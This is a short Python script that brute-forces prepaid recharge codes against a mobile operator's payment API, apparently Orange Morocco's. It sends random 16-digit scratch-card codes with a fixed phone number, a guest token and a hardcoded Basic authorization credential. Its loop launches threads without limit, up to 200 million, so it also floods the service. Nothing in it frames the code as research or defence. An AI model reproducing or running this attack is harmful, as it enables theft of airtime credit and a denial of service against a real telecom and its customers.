import requests as r
import threading,random
aa = 0
def fell_tools():
	a = str(''.join((random.choice("1234567890") for i in range(15))))
	orange = "8" +a
	data = {
        "recharge_name":"Recharge+*9+%28Smart+Solde%29+",
        "total":"5",
        "recharge_type":"13",
        "culture":"fr",
        "sc_source":"numbers",
        "sc_code":orange,
        "msisdn":"0773190012",
        "token":"SSO-GUEST-1646999797",
        "node_id":"52802"
    }
	headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Host": "apps.orange.ma",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Authorization": "Basic bW9iaWxlX3VzZXI6T3JhbmdlXzIwMTg="
	}
	url = "https://apps.orange.ma/orangeetmoi/api/backend/v7.8/simple/payment/sc"
	req = r.post(url, headers=headers, data=data)
	print(req)
threads = []
for i in range(200000000):
			thread1 = threading.Thread(target=fell_tools)
			thread1.start() 